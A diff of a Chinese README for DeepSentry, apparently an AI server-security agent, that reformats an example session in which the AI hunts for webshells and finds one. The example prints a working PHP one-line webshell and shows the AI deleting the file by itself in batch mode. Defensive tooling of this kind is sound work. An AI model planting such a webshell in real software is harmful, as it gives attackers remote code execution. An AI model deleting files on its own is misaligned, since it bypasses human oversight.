@@ -119,17 +119,24 @@ DeepSentry 内置了基于大语言模型（LLM）的决策大脑，能够理解
 
 **User**: "在 /var/www/html 目录帮我分析里面有没有可疑的webshell文件。"
 
-**🤖 AI 思考与执行**:
+**🤖** **AI 思考与执行**:
 
-1. **<font style="color:rgb(0, 0, 0);">初步尝试</font>**<font style="color:rgb(0, 0, 0);">: 使用 </font>`<font style="color:rgb(0, 0, 0);background-color:rgb(248, 248, 248);">find</font>`<font style="color:rgb(0, 0, 0);"> 结合 </font>`<font style="color:rgb(0, 0, 0);background-color:rgb(248, 248, 248);">grep</font>`<font style="color:rgb(0, 0, 0);"> 搜索 </font>`<font style="color:rgb(0, 0, 0);background-color:rgb(248, 248, 248);">eval</font>`<font style="color:rgb(0, 0, 0);">, </font>`<font style="color:rgb(0, 0, 0);background-color:rgb(248, 248, 248);">base64_decode</font>`<font style="color:rgb(0, 0, 0);"> 等危险函数。</font>
-+ _<font style="color:rgb(0, 0, 0);">AI 发现</font>_<font style="color:rgb(0, 0, 0);">: 扫描结果包含大量误报（如</font><font style="color:rgb(0, 0, 0);"> </font>`<font style="color:rgb(0, 0, 0);background-color:rgb(248, 248, 248);">jquery.uploadify</font>`<font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">和 CMS 核心文件）。</font>
-2. **<font style="color:rgb(0, 0, 0);">策略调整 (Pivot)</font>**<font style="color:rgb(0, 0, 0);">: AI 分析认为基于签名的搜索噪声太大，决定转向</font>**<font style="color:rgb(0, 0, 0);">行为分析</font>**<font style="color:rgb(0, 0, 0);">——查找最近 30 天内被修改过的 PHP 文件。</font>
-+ _<font style="color:rgb(0, 0, 0);">Command</font>_<font style="color:rgb(0, 0, 0);">:</font><font style="color:rgb(0, 0, 0);"> </font>`<font style="color:rgb(0, 0, 0);background-color:rgb(248, 248, 248);">find ... -mtime -30 ...</font>`
-3. **<font style="color:rgb(0, 0, 0);">锁定目标</font>**<font style="color:rgb(0, 0, 0);">: 发现可疑文件 </font>`<font style="color:rgb(0, 0, 0);background-color:rgb(248, 248, 248);">/var/www/html/protected/apps/member/hacker.php</font>`<font style="color:rgb(0, 0, 0);">。</font>
-4. **<font style="color:rgb(0, 0, 0);">取证分析</font>**<font style="color:rgb(0, 0, 0);">: 读取文件内容进行确认。</font>
-+ _<font style="color:rgb(0, 0, 0);">Result</font>_<font style="color:rgb(0, 0, 0);">:</font><font style="color:rgb(0, 0, 0);"> </font>`<font style="color:rgb(0, 0, 0);background-color:rgb(248, 248, 248);"><?php @eval($_POST['hacker']); ?></font>`<font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">(确认为一句话木马)。</font>
-5. **<font style="color:rgb(0, 0, 0);">自动处置</font>**<font style="color:rgb(0, 0, 0);">: 在 Batch 模式下，AI 决定立即删除威胁。</font>
-+ _<font style="color:rgb(0, 0, 0);">Command</font>_<font style="color:rgb(0, 0, 0);">: </font>`<font style="color:rgb(0, 0, 0);background-color:rgb(248, 248, 248);">rm .../hacker.php</font>`
+1. **初步尝试**: 使用 `find` 结合 `grep` 搜索 `eval`, `base64_decode` 等危险函数。
+
+- *AI 发现*: 扫描结果包含大量误报（如 `jquery.uploadify` 和 CMS 核心文件）。
+
+1. **策略调整 (Pivot)**: AI 分析认为基于签名的搜索噪声太大，决定转向**行为分析**——查找最近 30 天内被修改过的 PHP 文件。
+
+- *Command*: `find ... -mtime -30 ...`
+
+1. **锁定目标**: 发现可疑文件 `/var/www/html/protected/apps/member/hacker.php`。
+2. **取证分析**: 读取文件内容进行确认。
+
+- *Result*: `<?php @eval($_POST['hacker']); ?>` (确认为一句话木马)。
+
+1. **自动处置**: 在 Batch 模式下，AI 决定立即删除威胁。
+
+- *Command*: `rm .../hacker.php`
 
 **智能研判**:
 
